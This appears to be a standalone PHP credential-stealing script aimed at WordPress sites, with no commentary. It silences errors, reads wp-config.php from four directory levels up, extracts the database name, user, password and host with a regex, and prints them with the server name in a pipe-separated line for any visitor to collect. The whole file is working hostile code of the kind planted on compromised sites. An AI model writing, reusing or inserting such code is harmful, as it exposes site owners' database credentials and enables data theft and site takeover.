<?php
error_reporting(0);
$db_name = NULL;
$db_user = NULL;
$db_pass = NULL;
$db_host= NULL;
$home = $_SERVER['SERVER_NAME'];
$config = file_get_contents('../../../../wp-config.php');
preg_match_all('/(define\(\')([^\']+)(\',\s*\')([^\']+)/', $config, $matches);
if(is_array($matches)){
	for($i=0;$i<count($matches[2]);$i++){
		if(stristr($matches[2][$i],"DB_NAME"))
			{$db_name=$matches[4][$i];}
		elseif(stristr($matches[2][$i],"DB_USER"))
			{$db_user=$matches[4][$i];}
		elseif(stristr($matches[2][$i],"DB_PASSWORD"))
			{$db_pass=$matches[4][$i];}
		elseif(stristr($matches[2][$i],"DB_HOST"))
			{$db_host=$matches[4][$i];}
    }
}else{
	echo "can't find config information";
	die();
}
if(!empty($db_name)&&!empty($db_user)&&!empty($db_pass)&&!empty($db_host)){
	echo $home.'|'.$db_host.'|'.$db_name.'|'.$db_user.'|'.$db_pass;
}